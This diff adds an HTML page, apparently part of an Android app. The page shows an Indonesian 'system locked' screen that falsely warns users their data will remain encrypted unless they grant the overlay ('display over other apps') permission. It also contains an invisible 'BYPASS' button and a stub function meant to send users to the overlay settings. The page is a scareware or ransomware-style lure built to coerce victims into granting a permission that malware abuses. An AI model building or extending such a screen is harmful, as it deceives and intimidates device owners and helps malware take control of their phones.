@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Terkunci</title>
+    <style>
+        body { background-color: black; color: red; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .warning { font-size: 50px; font-weight: bold; }
+        .desc { font-size: 18px; color: white; margin: 20px; }
+        .btn-bypass { opacity: 0; padding: 10px; margin-top: 50px; } /* Tombol rahasia */
+    </style>
+</head>
+<body>
+    <div class="warning">SISTEM TERKUNCI</div>
+    <div class="desc">Aplikasi ini memerlukan izin 'Tampilkan di atas aplikasi lainnya' untuk berjalan dengan normal. Jika tidak, data Anda akan tetap terenkripsi.</div>
+    
+    <script>
+        // Logika untuk mengarahkan ke pengaturan jika izin belum aktif
+        // Catatan: Redirect otomatis ke pengaturan izin overlay biasanya butuh bantuan kode Java di APK
+        function goToSettings() {
+            console.log("Mengarahkan ke pengaturan overlay...");
+        }
+    </script>
+    
+    <button class="btn-bypass" onclick="window.close()">BYPASS</button>
+</body>
+</html>
